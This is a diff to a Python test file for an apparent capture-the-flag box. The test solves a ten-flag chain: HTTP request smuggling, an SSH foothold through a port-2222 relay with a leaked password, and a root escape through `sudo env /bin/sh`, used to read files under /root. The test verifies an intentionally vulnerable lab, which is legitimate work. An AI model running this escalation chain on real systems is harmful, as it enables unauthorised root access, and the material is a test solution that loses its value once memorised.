@@ -17,6 +17,16 @@ Every smuggling-reliant assertion below uses a raw `socket` helper, the
 same way request smuggling actually has to be built by hand (requests/
 curl normalize headers and refuse to construct this framing).
 
+frontproxy is this box's ONLY published front door -- admin-api never
+gets a published port on either backend. So frontproxy also runs a
+second listener (:2222), a blind bidirectional TCP relay straight
+through to admin-api:22, the same way a bastion host forwards SSH to
+an internal box. The SSH-foothold-and-privesc steps below (flags 6-10)
+connect through THAT published port, exactly the way a real external
+player would -- never docker exec, never a direct connection to
+admin-api itself (which test_admin_api_not_published_docker below
+confirms stays unpublished).
+
 A real, well-documented property of CL.TE response-queue poisoning: the
 single persistent backend connection frontproxy maintains means a
 smuggled response can sit queued behind earlier ones rather than
@@ -155,34 +165,32 @@ def _plain_get(host: str, port: int, path: str, timeout: float = 10.0) -> bytes:
 
 # --- SSH / privesc helpers ---------------------------------------------------
 
-def _ssh_via_frontproxy(frontproxy_container: str, command: str, timeout: float = 20.0) -> subprocess.CompletedProcess:
-    """admin-api has no published port at all -- by design, the only
-    network path to it is frontproxy's own smuggling bug, not a direct
-    connection. The SSH foothold step is therefore performed from a
-    shell on frontproxy's own container (which, being on the same
-    internal_groups network, can reach admin-api by alias) -- the same
-    docker-exec mechanism test_phase3_multihost.py already uses to
-    verify internal reachability, generalized here to actually run the
-    ssh command. See this box's commit message for why: frontproxy is
-    deliberately a minimal proxy with no RCE primitive of its own."""
+def _ssh_via_relay(host: str, relay_port: int, command: str, timeout: float = 20.0) -> subprocess.CompletedProcess:
+    """admin-api has no published port of its own, by design -- the
+    only network path a real external player has to it is through
+    frontproxy, which is why frontproxy also runs a blind TCP relay on
+    :2222 straight through to admin-api:22 (see
+    boxes-src/cloudbreak-master-frontdoor/docker/frontproxy/app.py).
+    This connects to THAT published port, exactly the way a real
+    player would -- never docker exec, never a direct connection to
+    admin-api."""
     return subprocess.run(
         [
-            "docker", "exec", frontproxy_container,
             "sshpass", "-p", OPS_SSH_PASSWORD,
             "ssh", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null", "-o", "ConnectTimeout=10",
-            "ops@admin-api", command,
+            "-p", str(relay_port), f"ops@{host}", command,
         ],
         capture_output=True, text=True, timeout=timeout,
     )
 
 
-def _escalate_via_env(frontproxy_container: str, shell_command: str, timeout: float = 20.0) -> str:
+def _escalate_via_env(host: str, relay_port: int, shell_command: str, timeout: float = 20.0) -> str:
     """The box's one intended privesc: ops has passwordless sudo on
     /usr/bin/env -- the GTFOBins escape is `sudo env /bin/sh`, which
     spawns a root shell because env execs its argument with sudo's own
     (root) privileges."""
     remote_cmd = f"sudo env /bin/sh -c {shlex.quote(shell_command)}"
-    result = _ssh_via_frontproxy(frontproxy_container, remote_cmd, timeout=timeout)
+    result = _ssh_via_relay(host, relay_port, remote_cmd, timeout=timeout)
     assert result.returncode == 0, f"env escalation failed: rc={result.returncode} stdout={result.stdout!r} stderr={result.stderr!r}"
     return result.stdout
 
@@ -239,38 +247,43 @@ def test_full_ten_flag_chain(box_instance):
     dashboard = _smuggle_fetch(host, web_port, "/admin/dashboard", marker=expected_flag(secret, 4)).decode("latin-1")
     assert expected_flag(secret, 4) in dashboard
 
-    # Flag 5: smuggle to /admin/users -- a JSON blob with the flag AND
-    # the ops SSH credential.
+    # Flag 5: smuggle to /admin/users -- a JSON blob with the flag, the
+    # ops SSH credential, and a hint pointing at frontproxy's own :2222
+    # relay (the only real network path to admin-api's sshd).
     users = _smuggle_fetch(host, web_port, "/admin/users", marker=expected_flag(secret, 5)).decode("latin-1")
     assert expected_flag(secret, 5) in users
     assert OPS_SSH_PASSWORD in users
     assert "ops" in users
+    assert "2222" in users
 
-    # Flag 6: SSH foothold on admin-api using the recovered credential.
-    frontproxy = _frontproxy_container(team_id)
-    user_txt = _ssh_via_frontproxy(frontproxy, "cat user.txt")
+    # Flag 6: SSH foothold on admin-api using the recovered credential --
+    # through frontproxy's published :2222 relay, the box's only actual
+    # network path to admin-api's sshd (admin-api itself has no
+    # published port at all, on either backend).
+    relay_port = _port(inst, 2222)
+    user_txt = _ssh_via_relay(host, relay_port, "cat user.txt")
     assert user_txt.returncode == 0, user_txt.stderr
     assert expected_flag(secret, 6) in user_txt.stdout
 
     # Flag 7: the hint file pointing at the sudo/GTFOBins privesc.
-    notes = _ssh_via_frontproxy(frontproxy, "cat notes.txt")
+    notes = _ssh_via_relay(host, relay_port, "cat notes.txt")
     assert notes.returncode == 0, notes.stderr
     assert expected_flag(secret, 7) in notes.stdout
     assert "env" in notes.stdout
 
-    sudo_l = _ssh_via_frontproxy(frontproxy, "sudo -l")
+    sudo_l = _ssh_via_relay(host, relay_port, "sudo -l")
     assert "/usr/bin/env" in sudo_l.stdout
 
     # Flag 8: a root-only file, read via the env escape.
-    audit = _escalate_via_env(frontproxy, "cat /root/secret/audit.log")
+    audit = _escalate_via_env(host, relay_port, "cat /root/secret/audit.log")
     assert expected_flag(secret, 8) in audit
 
     # Flag 9: pre-root checkpoint note, same escape.
-    checkpoint = _escalate_via_env(frontproxy, "cat /root/secret/checkpoint.txt")
+    checkpoint = _escalate_via_env(host, relay_port, "cat /root/secret/checkpoint.txt")
     assert expected_flag(secret, 9) in checkpoint
 
     # Flag 10: root.txt.
-    root_txt = _escalate_via_env(frontproxy, "cat /root/root.txt")
+    root_txt = _escalate_via_env(host, relay_port, "cat /root/root.txt")
     assert expected_flag(secret, 10) in root_txt
 
 
